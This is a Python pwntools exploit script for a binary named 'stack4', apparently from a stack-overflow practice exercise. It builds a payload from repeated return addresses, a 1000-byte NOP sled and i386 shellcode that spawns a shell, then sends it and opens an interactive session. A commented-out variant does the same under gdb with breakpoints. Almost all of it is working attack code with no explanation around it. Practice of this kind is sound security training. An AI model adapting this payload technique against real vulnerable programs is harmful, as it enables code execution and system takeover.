#!/usr/bin/python
#solved locally without attaching gdb
from pwn import *

context.binary = "./stack4"
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

elf = ELF('./stack4')
p = elf.process()

offset_ecx = 68
offset_ret = 80

buff_addr = p32(0xffffd640 & 0xfffffff0) # +0x4 bytes to account for lea esp, ecx-0x4
code_addr = p32(0xffffd740) # middle of nop slide

code = asm(shellcraft.i386.nop())*1000+asm(shellcraft.i386.sh())
payload = flat({0:code_addr, 4: code_addr, 8:code_addr, 12:code_addr, 
               16:code_addr, 20: code_addr, 24: code_addr, 28: code_addr, 
               32:code_addr, 36: code_addr, 40: code_addr, 44: code_addr,
               48:code_addr, 52: code_addr, 56: code_addr, 60: code_addr,
               64:code_addr, offset_ecx: buff_addr, 72: code_addr, 76: code_addr, 
               offset_ret: 0xffffffff}, code)

p.sendline(payload) 
p.interactive()


# Solved in tmux + gdb.debug locally
# from pwn import *

# context.binary = "./stack4"
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# #p = process('./stack4') 
# p = gdb.debug('./stack4', gdbscript='''
#                                             b *main
#                                             b *main+41
#                                             b *main+110 
#                                             continue
#                                         ''')
        
# offset_ecx = 68
# offset_ret = 80

# retaddr = p32(0xffffd5b0)
# code_addr = p32(0xffffd700)

# code = asm(shellcraft.i386.nop())*1000+asm(shellcraft.i386.sh())
# payload = flat({0: code_addr, offset_ecx : retaddr, offset_ret : retaddr}, code)

# p.sendline(payload) 
# p.interactive()